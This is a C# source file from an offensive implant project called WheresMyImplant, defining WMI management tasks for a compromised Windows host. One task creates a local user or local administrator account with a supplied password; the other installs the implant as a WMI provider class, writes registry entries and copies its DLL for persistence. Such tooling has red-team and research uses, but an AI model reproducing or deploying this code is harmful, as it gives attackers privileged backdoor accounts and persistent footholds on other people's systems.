using System;
using System.Management.Instrumentation;
using System.Text;

namespace WheresMyImplant
{
    public partial class Implant
    {
        [ManagementTask]
        public static String AddUser(String username, String password, String admin)
        {
            if (!Boolean.TryParse(admin, out Boolean isAdmin))
            {
                return String.Empty;
            }

            AddUser add = new AddUser();
            if (isAdmin)
            {
                add.AddLocalAdmin(username, password);
                return "Admin Added";
            }
            add.AddLocalUser(username, password);
            return "User Added";
        }

        [ManagementTask]
        public static String Install()
        {
            StringBuilder output = new StringBuilder();
            InstallWMI install = new InstallWMI(".", @"ROOT\cimv2", "Win32_Implant");
            try
            {
                install.ExtensionProviderSetup();
                install.GetMethods();
                install.AddRegistryLocal();
                install.CopyDll();
            }
            catch (Exception ex)
            {
                output.Append(ex.ToString());
            }
            finally
            {
                output.Append(install.GetOutput());
            }
            return output.ToString();
        }
    }
}